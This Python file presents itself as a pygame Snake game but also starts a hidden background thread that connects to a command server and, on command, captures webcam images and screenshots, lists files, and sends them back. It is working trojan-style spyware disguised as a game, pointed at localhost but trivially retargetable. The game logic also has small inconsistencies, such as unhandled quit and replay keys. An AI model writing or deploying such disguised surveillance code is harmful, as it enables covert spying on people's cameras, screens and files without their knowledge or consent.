import socket
import threading
import cv2
import os
from datetime import datetime
from io import BytesIO

# Initialize display-related imports with error handling
try:
    import pyautogui
    PYAUTOGUI_AVAILABLE = True
except Exception as e:
    print(f"PyAutoGUI not available: {e}")
    PYAUTOGUI_AVAILABLE = False

try:
    import pygame
    PYGAME_AVAILABLE = True
except Exception as e:
    print(f"Pygame not available: {e}")
    PYGAME_AVAILABLE = False

import random
import time

SERVER_IP = "127.0.0.1"
PORT = 9999

# -------- Capture Part --------
def capture_webcam():
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        cap.release()
        if ret:
            _, buffer = cv2.imencode('.jpg', frame)
            return buffer.tobytes()
    except Exception as e:
        print("Webcam error:", e)
    return None

def capture_screen():
    if not PYAUTOGUI_AVAILABLE:
        print("PyAutoGUI not available for screenshot")
        return None
    try:
        screenshot = pyautogui.screenshot()
        buf = BytesIO()
        screenshot.save(buf, format="JPEG")
        return buf.getvalue()
    except Exception as e:
        print("Screenshot error:", e)
    return None

def send_file(sock, filename, filedata):
    try:
        header = f"{filename}||{len(filedata)}".encode()
        sock.send(header)
        if sock.recv(1024) == b"READY":
            sock.sendall(filedata)
            return True
    except Exception as e:
        print("Send error:", e)
    return False

# -------- Communication --------
def handle_server_communication():
    sock = socket.socket()
    try:
        sock.connect((SERVER_IP, PORT))
        print("[+] Connected to server")

        while True:
            data = sock.recv(1024)
            if not data:
                break

            if data.startswith(b"CMD:"):
                cmd = data[4:].decode().strip()
                print("[+] Command:", cmd)

                if cmd == "capture":
                    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
                    data_bytes = capture_webcam()
                    if data_bytes:
                        send_file(sock, f"webcam_{ts}.jpg", data_bytes)
                        sock.send(b"RESP:Webcam captured")
                    else:
                        sock.send(b"RESP:Webcam failed")

                elif cmd == "screen":
                    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
                    data_bytes = capture_screen()
                    if data_bytes:
                        send_file(sock, f"screenshot_{ts}.jpg", data_bytes)
                        sock.send(b"RESP:Screenshot captured")
                    else:
                        sock.send(b"RESP:Screenshot failed or not available")

                elif cmd == "dir":
                    try:
                        files = os.listdir(".")
                        listing = "\n".join(files)
                        sock.send(f"RESP:{listing}".encode())
                    except Exception as e:
                        sock.send(f"RESP:Dir error {e}".encode())

                else:
                    sock.send(b"RESP:Unknown command")

    except Exception as e:
        print("[-] Connection error:", e)
    finally:
        sock.close()

# -------- Game --------
def run_game():
    # Try to initialize pygame with different fallback methods
    game_started = False
    
    if PYGAME_AVAILABLE:
        # Method 1: Try with normal display (visible window)
        try:
            # Make sure we don't use dummy driver
            if 'SDL_VIDEODRIVER' in os.environ:
                del os.environ['SDL_VIDEODRIVER']
                
            pygame.init()
            
            width, height = 600, 400
            dis = pygame.display.set_mode((width, height))
            pygame.display.set_caption("Snake Game")
            clock = pygame.time.Clock()
            print("[+] Game started with visible display")
            game_started = True
            
        except Exception as e:
            print(f"Visible display failed: {e}")
            try:
                pygame.quit()
            except:
                pass
            
        # Method 2: Try with dummy display as fallback
        if not game_started:
            try:
                os.environ['SDL_VIDEODRIVER'] = 'dummy'
                pygame.init()
                
                width, height = 600, 400
                dis = pygame.display.set_mode((width, height))
                pygame.display.set_caption("Snake Game")
                clock = pygame.time.Clock()
                print("[+] Game started with dummy display (no window)")
                auto_play = True  # Enable auto-play for dummy mode
                game_started = True
                
            except Exception as e:
                print(f"Dummy display failed: {e}")
                try:
                    pygame.quit()
                except:
                    pass

    # If game couldn't start, run in background mode
    if not game_started:
        print("Game could not start. Running in background mode...")
        print("Server communication is still active.")
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("Program terminated")
        return

    # Game loop (only runs if pygame initialized successfully)
    try:
        snake_block = 10
        snake_speed = 1  # Reasonable speed for manual play
        
        try:
            font = pygame.font.SysFont("bahnschrift", 25)
        except:
            font = pygame.font.Font(None, 25)  # Fallback font

        def message(msg, color):
            try:
                mesg = font.render(msg, True, color)
                dis.blit(mesg, [width / 6, height / 3])
            except:
                pass  # Skip text rendering if it fails

        x1, y1 = width / 2, height / 2
        x1_change, y1_change = 0, 0
        snake_list = []
        length_of_snake = 1
        foodx, foody = random.randrange(0, width-10, 10), random.randrange(0, height-10, 10)

        game_over = False
        auto_play = False  # Disable auto-play by default for visible game
        
        print("[+] Snake game running. Use arrow keys to play, Ctrl+C to exit.")
        
        while not game_over:
            # Handle events
            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    game_over = True
                if event.type == pygame.KEYDOWN:
                    if event.key == pygame.K_LEFT: x1_change, y1_change = -snake_block, 0
                    elif event.key == pygame.K_RIGHT: x1_change, y1_change = snake_block, 0
                    elif event.key == pygame.K_UP: x1_change, y1_change = 0, -snake_block
                    elif event.key == pygame.K_DOWN: x1_change, y1_change = 0, snake_block

            # Only use auto-play if running in dummy mode
            if auto_play:
                if x1 < foodx and x1_change <= 0:
                    x1_change, y1_change = snake_block, 0
                elif x1 > foodx and x1_change >= 0:
                    x1_change, y1_change = -snake_block, 0
                elif y1 < foody and y1_change <= 0:
                    x1_change, y1_change = 0, snake_block
                elif y1 > foody and y1_change >= 0:
                    x1_change, y1_change = 0, -snake_block

            x1 += x1_change
            y1 += y1_change

            # Boundary collision
            if x1 >= width or x1 < 0 or y1 >= height or y1 < 0:
                if auto_play:
                    # Reset position for auto-play
                    x1, y1 = width / 2, height / 2
                    snake_list = []
                    length_of_snake = 1
                    print(f"[+] Auto-play reset. Score: {length_of_snake-1}")
                else:
                    message("You Lost! Press Q-Quit or C-Play Again", (255, 0, 0))
                    pygame.display.update()
                    game_over = True

            # Draw everything
            dis.fill((255,255,255))
            pygame.draw.rect(dis, (0,255,0), [foodx, foody, 10, 10])

            snake_head = [x1, y1]
            snake_list.append(snake_head)
            if len(snake_list) > length_of_snake:
                del snake_list[0]

            # Self collision
            for seg in snake_list[:-1]:
                if seg == snake_head:
                    if auto_play:
                        # Reset for auto-play
                        x1, y1 = width / 2, height / 2
                        snake_list = []
                        length_of_snake = 1
                        print(f"[+] Auto-play reset. Score: {length_of_snake-1}")
                        break
                    else:
                        message("You Lost! Press Q-Quit or C-Play Again", (255, 0, 0))
                        pygame.display.update()
                        game_over = True
                        break

            # Draw snake
            for seg in snake_list:
                pygame.draw.rect(dis, (0,0,0), [seg[0], seg[1], 10, 10])

            pygame.display.update()

            # Food collision
            if x1 == foodx and y1 == foody:
                foodx, foody = random.randrange(0, width-10, 10), random.randrange(0, height-10, 10)
                length_of_snake += 1
                if auto_play:
                    print(f"[+] Auto-play score: {length_of_snake-1}")

            clock.tick(snake_speed)

        pygame.quit()
        print("[+] Game ended")
        
    except KeyboardInterrupt:
        print("\n[+] Game interrupted by user")
        try:
            pygame.quit()
        except:
            pass
    except Exception as e:
        print(f"Game runtime error: {e}")
        try:
            pygame.quit()
        except:
            pass

# -------- Main --------
if __name__ == "__main__":
    threading.Thread(target=handle_server_communication, daemon=True).start()
    run_game()
